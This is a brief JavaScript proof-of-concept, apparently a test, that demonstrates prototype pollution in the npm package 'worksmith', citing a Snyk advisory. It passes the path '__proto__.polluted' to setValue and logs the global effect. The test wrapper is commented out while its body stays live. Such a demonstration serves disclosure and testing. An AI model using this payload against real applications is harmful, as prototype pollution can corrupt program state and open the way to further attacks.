// //https://snyk.io/vuln/SNYK-JS-WORKSMITH-598798

// test("prototype pollution in worksmith", () => {
  const worksmith = require("worksmith");
  obj = {};

console.log({}.polluted);

  worksmith.setValue({}, "__proto__.polluted", "yes");
console.log({}.polluted);
// });
